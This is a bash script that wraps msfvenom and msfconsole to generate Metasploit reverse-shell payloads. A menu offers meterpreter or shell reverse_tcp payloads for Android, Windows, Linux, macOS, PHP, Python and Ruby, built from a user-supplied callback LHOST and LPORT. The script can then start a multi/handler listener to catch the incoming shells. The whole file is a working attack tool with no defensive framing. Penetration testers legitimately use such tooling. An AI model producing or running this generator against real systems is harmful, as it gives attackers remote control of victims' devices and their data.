#!/bin/bash

# The user is prompted to enter the LHOST, LPORT, and the payload name
read -p "Enter the LHOST for the payload: " LHOST 
export LHOST=$LHOST
read -p "Enter the LPORT for the payload: " LPORT
export LPORT=$LPORT
read -p "Enter the NAME for the payload: " PAYLOADNAME
export PAYLOADNAME=$PAYLOADNAME

# The user is prompted to select the payload type
echo "Select the payload type:"
echo "1. Android"
echo "2. Windows"
echo "3. Windows Shell"
echo "4. Linux"
echo "5. macOS"
echo "6. PHP"
echo "7. Python"
echo "8. Ruby"
echo
read -p "Enter the payload type (1-8): " PAYLOAD_TYPE

# Map user input to Metasploit payload names and file extensions
case $PAYLOAD_TYPE in
    1)
        PAYLOAD="android/meterpreter/reverse_tcp"
        FILE_EXTENSION="apk"
        ;;
    2)
        PAYLOAD="windows/meterpreter/reverse_tcp"
        FILE_EXTENSION="exe"
        ;;
    3)
        PAYLOAD="windows/shell_reverse_tcp"
        FILE_EXTENSION="exe"
        ;;
    4)
        PAYLOAD="linux/x86/meterpreter/reverse_tcp"
        FILE_EXTENSION="elf"
        ;;
    5)
        PAYLOAD="osx/x86/shell_reverse_tcp"
        FILE_EXTENSION="macho"
        ;;
    6)
        PAYLOAD="php/meterpreter_reverse_tcp"
        FILE_EXTENSION="php"
        ;;
    7)
        PAYLOAD="python/meterpreter_reverse_tcp"
        FILE_EXTENSION="py"
        ;;
    8)
        PAYLOAD="ruby/shell_reverse_tcp"
        FILE_EXTENSION="rb"
        ;;
    *)
        echo "Invalid option"
        exit 1
        ;;
esac

# The payload is created using msfvenom
echo "Creating the payload..."
msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -o $PAYLOADNAME.$FILE_EXTENSION

if [ $? -eq 0 ]; then
    echo "Payload created successfully"
    echo "Payload saved as $PAYLOADNAME.$FILE_EXTENSION"
else
    echo "Error creating the payload. Please check your settings."
fi

# Ask the user if they want to start a Metasploit listener
read -p "Do you want to start a Metasploit listener? (y/n): " START_LISTENER 

# If the user chooses to start a listener, we start a Metasploit listener
if [ $START_LISTENER == "y" ]; then

    
    # On the listener side, we use another LHOST and LPORT to listen for incoming connections
    read -p "Enter the LHOST for the listener: " LHOST_LISTENER
    export LHOST_LISTENER=$LHOST_LISTENER
    read -p "Enter the LPORT for the listener: " LPORT_LISTENER
    export LPORT_LISTENER=$LPORT_LISTENER

    echo "Starting Metasploit listener..."
    sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD $PAYLOAD; set LHOST $LHOST_LISTENER; set LPORT $LPORT_LISTENER; exploit"
fi

exit 0